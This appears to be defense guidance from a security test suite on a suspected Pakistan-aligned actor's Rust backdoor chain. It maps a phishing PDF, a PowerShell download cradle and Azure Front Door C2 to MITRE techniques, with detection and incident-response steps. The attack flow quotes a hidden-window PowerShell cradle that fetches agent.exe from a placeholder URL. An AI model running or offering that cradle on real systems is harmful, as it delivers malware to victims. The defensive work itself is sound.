# Defense Guidance: UNK_RobotDreams Rust Backdoor Execution Chain

## Executive Summary

This document provides comprehensive defense guidance for protecting against **UNK_RobotDreams**, a sophisticated, suspected Pakistan-aligned threat actor that strategically targets India-based offices of Middle Eastern government organizations. They use custom Rust malware delivered via spearphishing PDFs and leverage Microsoft's Azure Front Door CDN for domain fronting C2 communication.

| Field | Value |
|-------|-------|
| **Test ID** | 414a4c61-019f-48ba-934d-d5e91a29a878 |
| **Test Name** | UNK_RobotDreams Rust Backdoor Execution Chain |
| **MITRE ATT&CK** | [T1204.002](https://attack.mitre.org/techniques/T1204/002/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1573.001](https://attack.mitre.org/techniques/T1573/001/), [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
| **Tactics** | Execution, Command and Control, Defense Evasion |
| **Threat Actor** | UNK_RobotDreams (Pakistan-aligned) |
| **Severity** | HIGH |
| **Test Score** | 8.5/10 |

---

## Threat Overview

### Attack Description

UNK_RobotDreams conducts campaigns impersonating the Indian Ministry of External Affairs (MEA), sending "Gulf Security Alert" emails with PDF attachments containing a fake Adobe Reader button. Clicking the button triggers download of an executable loader, which uses PowerShell for payload retrieval, establishing persistent C2 via Azure Front Door CDN ("domain fronting"). The malware itself is written in Rust for high performance and analysis resistance.

### Attack Flow

```
[1] Spearphishing PDF Lure (T1204.002)
    -> Gulf_Security_Alert_MEA_2026.pdf with fake Adobe button
    -> OpenAction URI triggers download from Azure CDN
         |
         v
[2] PowerShell Download Cradle (T1059.001 + T1105)
    -> powershell -w hidden -c "iwr <azure-url>/agent.exe -outf ..."
    -> Hidden window, ExecutionPolicy Bypass, Invoke-WebRequest
    -> Downloads and stages Rust backdoor as agent.exe
         |
         v
[3] Azure Front Door C2 (T1071.001 + T1573.001 + T1036.005)
    -> AES-256-GCM encrypted system metadata
    -> HTTPS POST to *.azurefd.net (domain fronting)
    -> Azure-specific headers mask true C2 destination
```

---

## Defensive Recommendations by Technique

### T1204.002 - User Execution: Malicious File

**Prevention:**
- Enable Microsoft Defender SmartScreen for PDF and executable downloads
- Configure email gateway to strip or quarantine PDFs with embedded OpenAction URI actions
- Implement Mark of the Web (MOTW) enforcement for downloaded files
- Deploy endpoint DLP to prevent execution of files from untrusted download locations

**Detection:**
- Alert on PDF files with OpenAction URI references to executable downloads
- Monitor for PDF and executable files created in the same user directory within a short timeframe
- Track file creation events for executables with Adobe-themed names outside Program Files

### T1059.001 - PowerShell (Download Cradle)

**Prevention:**
- Enable PowerShell Constrained Language Mode via Device Guard or AppLocker
- Configure AMSI (Antimalware Scan Interface) to scan PowerShell script blocks
- Block PowerShell execution with `-WindowStyle Hidden` via ASR rules
- Implement PowerShell logging (ScriptBlock logging, Module logging, Transcription)
- Restrict PowerShell execution policy via Group Policy (do not rely on this alone)

**Detection:**
- Alert on PowerShell with hidden window flag combined with web download cmdlets
- Monitor for Invoke-WebRequest, iwr, or Net.WebClient in PowerShell command lines
- Track PowerShell ExecutionPolicy Bypass combined with file download operations
- Enable PowerShell ScriptBlock Logging (Event ID 4104) for complete command visibility

### T1105 - Ingress Tool Transfer

**Prevention:**
- Deploy web proxy with SSL inspection to detect executable downloads
- Block executable file downloads from CDN domains via web filtering
- Implement application allowlisting to prevent execution of downloaded binaries
- Configure Windows Defender to scan all downloaded files before execution

**Detection:**
- Monitor for Invoke-WebRequest or curl downloading .exe files to user directories
- Alert on files named "agent.exe" created in user profile or temp directories
- Track Start-Process or Invoke-Expression called on recently downloaded files

### T1071.001 - Web Protocols (C2 via HTTPS)

**Prevention:**
- Deploy SSL/TLS inspection on egress traffic
- Implement domain reputation scoring for outbound HTTPS connections
- Block or monitor outbound connections to Azure Front Door from non-browser processes
- Deploy network traffic analysis (NTA) with JA3/JA3S fingerprinting

**Detection:**
- Alert on non-browser processes making HTTPS connections to *.azurefd.net or *.azureedge.net
- Monitor for unusual Azure CDN traffic volume or timing patterns from endpoints
- Track HTTP requests with Azure-specific headers (X-Azure-Ref, X-FD-HealthProbe) from non-Azure tools
- Alert on base64-encoded data in HTTP POST bodies to CDN endpoints

### T1573.001 - Encrypted Channel: Symmetric Cryptography

**Prevention:**
- Deploy SSL inspection to gain visibility into encrypted C2 channels
- Implement data loss prevention (DLP) rules for base64-encoded file exfiltration
- Monitor file creation of encrypted data (.dat, .bin) in staging directories

**Detection:**
- Alert on creation of encrypted data files in unusual directories (c2_staging, beacon, exfil)
- Monitor for AES/encryption library usage in processes that don't normally perform encryption
- Track base64 encoding operations followed by HTTP POST requests

### T1036.005 - Masquerading: Match Legitimate Name or Location

**Prevention:**
- Implement application allowlisting (AppLocker, WDAC) to restrict executable names and paths
- Configure ASR rules to block execution of unsigned binaries with Microsoft-themed names
- Deploy code signing enforcement for all executables

**Detection:**
- Alert on executables named after Adobe products running from non-standard paths
- Monitor for processes with CDN domain references (azurefd.net, azureedge.net) in their arguments
- Track HTTP Host header mismatches (Host header references CDN but destination IP is unusual)

---

## Incident Response Playbook

### Phase 1: Detection & Triage (0-30 minutes)

1. **Identify the alert trigger** -- Determine which detection rule fired (PDF lure, PowerShell cradle, Azure CDN C2, or combined correlation)
2. **Isolate the endpoint** -- If combined correlation alert fires, immediately network-isolate the affected host
3. **Capture volatile data** -- Collect running processes, network connections, PowerShell history, and event logs before remediation
4. **Check for lateral movement** -- Search for the same user account authenticating to other systems

### Phase 2: Investigation (30-120 minutes)

5. **Analyze PowerShell logs** -- Review Event ID 4104 (ScriptBlock) for the exact download cradle command
6. **Check downloaded files** -- Locate and hash any agent.exe or AdobeAcrobatUpdate.exe files; submit to sandbox
7. **Review PDF artifacts** -- Examine the Gulf Security Alert PDF for OpenAction URI targets
8. **Network forensics** -- Check proxy/firewall logs for connections to azurefd.net or azureedge.net from the affected host
9. **Search for beacon data** -- Look for encrypted .dat files in staging directories

### Phase 3: Containment & Eradication (2-8 hours)

10. **Block C2 infrastructure** -- Add identified Azure Front Door endpoints to firewall blocklist
11. **Remove malware artifacts** -- Delete agent.exe, AdobeAcrobatUpdate.exe, PDF lures, and encrypted beacon files
12. **Clear PowerShell history** -- Remove cached download commands
13. **Reset credentials** -- Change passwords for any accounts active on the compromised host
14. **Scan for persistence** -- Check scheduled tasks, Run keys, and startup items for backdoor persistence

### Phase 4: Recovery & Lessons Learned (1-5 days)

15. **Restore from clean backup** if malware persistence is confirmed
16. **Deploy updated detections** -- Import provided KQL/Sigma/YARA rules to SIEM
17. **User awareness** -- Brief targeted users about Gulf Security Alert PDF phishing campaign
18. **Update threat intelligence** -- Share IOCs with peer organizations and ISACs
19. **Document findings** -- Create incident report with timeline, IOCs, and remediation steps

---

## Detection Rules Summary

| Format | File | Rules Count |
|--------|------|-------------|
| KQL (Microsoft Sentinel/Defender) | `414a4c61-019f-48ba-934d-d5e91a29a878_detections.kql` | 5 |
| YARA | `414a4c61-019f-48ba-934d-d5e91a29a878_rules.yar` | 4 |
| Sigma | `414a4c61-019f-48ba-934d-d5e91a29a878_sigma_rules.yml` | 5 |
| Elastic EQL | `414a4c61-019f-48ba-934d-d5e91a29a878_elastic_rules.ndjson` | 5 |
| LimaCharlie D&R | `414a4c61-019f-48ba-934d-d5e91a29a878_dr_rules.yaml` | 5 |

## Hardening Scripts

| Platform | File |
|----------|------|
| Windows | `414a4c61-019f-48ba-934d-d5e91a29a878_hardening.ps1` |

---

## References

- [MITRE ATT&CK - T1204.002](https://attack.mitre.org/techniques/T1204/002/)
- [MITRE ATT&CK - T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK - T1105](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK - T1071.001](https://attack.mitre.org/techniques/T1071/001/)
- [MITRE ATT&CK - T1573.001](https://attack.mitre.org/techniques/T1573/001/)
- [MITRE ATT&CK - T1036.005](https://attack.mitre.org/techniques/T1036/005/)
- [Iran War Bait Fuels TA453, TA473 Phishing Campaigns - GBHackers](https://gbhackers.com/iran-war-bait/)
